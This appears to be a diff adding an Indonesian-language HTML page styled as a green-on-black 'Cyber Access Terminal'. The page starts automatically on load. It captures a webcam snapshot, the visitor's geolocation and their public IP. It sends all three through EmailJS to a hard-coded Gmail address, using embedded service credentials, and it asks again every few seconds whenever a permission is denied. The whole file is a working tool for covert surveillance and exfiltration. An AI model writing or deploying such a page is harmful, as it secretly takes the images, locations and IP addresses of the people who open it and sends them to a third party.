@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Cyber Access Terminal</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      background-color: black;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+    }
+    #terminal {
+      white-space: pre-line;
+      border: 1px solid #00ff00;
+      padding: 20px;
+      height: 400px;
+      overflow-y: auto;
+      background-color: #000000;
+    }
+  </style>
+</head>
+<body>
+  <div id="terminal">[+] Sistem Cyber Terminal Aktif\n</div>
+
+  <script>
+    emailjs.init("GLY26LO9lMf5Nd48g"); // <- Ganti kalau pakai public key lain
+
+    const terminal = document.getElementById("terminal");
+
+    function ketik(teks) {
+      terminal.innerText += teks + "\n";
+      terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    function ambilSemuaData() {
+      ketik("[!] Meminta akses kamera...");
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          ketik("[✓] Kamera diizinkan");
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              const canvas = document.createElement("canvas");
+              canvas.width = 240;
+              canvas.height = 180;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const gambar = canvas.toDataURL("image/jpeg", 0.5);
+              ketik("[✓] Gambar ditangkap.");
+
+              ketik("[!] Meminta lokasi...");
+              navigator.geolocation.getCurrentPosition(pos => {
+                const lokasi = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
+                ketik("[✓] Lokasi didapat.");
+
+                ketik("[!] Memeriksa IP publik...");
+                fetch("https://api.ipify.org?format=json")
+                  .then(res => res.json())
+                  .then(data => {
+                    const ip = data.ip;
+                    ketik("[✓] IP: " + ip);
+
+                    const templateParams = {
+                      to_email: "newari363@gmail.com",
+                      gambar: gambar,
+                      lokasi: lokasi,
+                      ip: ip
+                    };
+
+                    ketik("[⇨] Mengirim data ke email...");
+                    emailjs.send("service_flvybff", "template_dsmq48i", templateParams)
+                      .then(() => ketik("[✓] Data berhasil dikirim ke Gmail."))
+                      .catch(err => ketik("[X] Gagal kirim: " + err));
+                  })
+                  .catch(err => {
+                    ketik("[X] Gagal ambil IP: " + err.message);
+                  });
+
+              }, err => {
+                ketik("[X] Akses lokasi ditolak.");
+                setTimeout(ambilSemuaData, 4000); // ulangi jika ditolak
+              });
+
+            }, 1500);
+          };
+        })
+        .catch(err => {
+          ketik("[X] Akses kamera ditolak.");
+          setTimeout(ambilSemuaData, 4000); // ulangi jika ditolak
+        });
+    }
+
+    // Mulai otomatis saat halaman dibuka
+    setTimeout(ambilSemuaData, 1000);
+  </script>
+</body>
+</html>
